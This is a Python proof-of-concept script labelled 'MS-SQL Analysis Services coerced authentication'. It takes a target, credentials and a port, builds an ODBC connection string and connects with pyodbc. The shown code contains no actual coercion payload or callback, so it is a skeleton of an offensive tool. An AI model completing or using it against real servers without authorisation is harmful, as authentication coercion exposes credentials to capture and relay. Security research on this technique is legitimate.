#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : poc.py
# Author             : Podalirius (@podalirius_)
# Date created       : 19 Feb 2022

"""
apt-get install curl apt-transport-https
curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add -
curl https://packages.microsoft.com/config/ubuntu/16.04/prod.list | tee /etc/apt/sources.list.d/msprod.list

apt-get update
ACCEPT_EULA=y DEBIAN_FRONTEND=noninteractive apt-get install mssql-tools unixodbc unixodbc-dev -y
"""

import pyodbc
import argparse


def create_connection_string(server, database, username, password, port=1433, verbose=False):
    drivers = [item for item in pyodbc.drivers()]
    if len(drivers) != 0:
        driver = drivers[-1]
        if verbose:
            print("[debug] Choosing driver: %s" % driver)
        data = {
            "DRIVER": driver,
            "SERVER": server,
            "PORT": port,
            "DATABASE": database,
            "UID": username,
            "PWD": password
        }
        # cs = f'DRIVER={driver};SERVER={server};DATABASE={database};UID={uid};PWD={pwd}'
        cs = ';'.join([str(key)+"="+str(value) for key, value in data.items()])
        return cs
    else:
        if verbose:
            print("[debug] No pyodbc drivers available.")
        return None


def parseArgs():
    print("MS-SQL Analysis Services coerced authentication - v1.1      @podalirius_\n")
    parser = argparse.ArgumentParser(description="Description message")
    parser.add_argument("-t", "--target", default=None, required=True, help='MSSQL Analysis target ip')
    parser.add_argument("-u", "--user", default=None, required=True, help='Username')
    parser.add_argument("-p", "--password", default=None, required=True, help='Password')
    parser.add_argument("-d", "--database", default=None, required=True, help='MSSQL Analysis target database')
    parser.add_argument("-P", "--port", default=2382, required=False, help='MSSQL Analysis target port')
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    # connstr = 'Driver={SQL Server};Server=127.0.0.1;Database=DB1;Trusted_Connection=yes;'
    # connstr = 'DRIVER={SQL Server};SERVER=' + options.target + ';DATABASE=DB1;Trusted_Connection=yes;UID=TB\\user;PWD=123123'
    # connstr = 'DRIVER={FreeTDS};SERVER=yourservername.com;PORT=1433;DATABASE=db_name;UID=db_user;PWD=db_password;TDS_Version=7.2;'

    connstr = create_connection_string(options.target, options.database, options.user, options.password, port=options.port, verbose=options.verbose)

    if connstr is not None:
        if options.verbose:
            print("[debug] Connection string: %s" % connstr)
        try:
            conn = pyodbc.connect(connstr, autocommit=True)
        except pyodbc.OperationalError as e:
            print("[error] %s" % e.args[1])
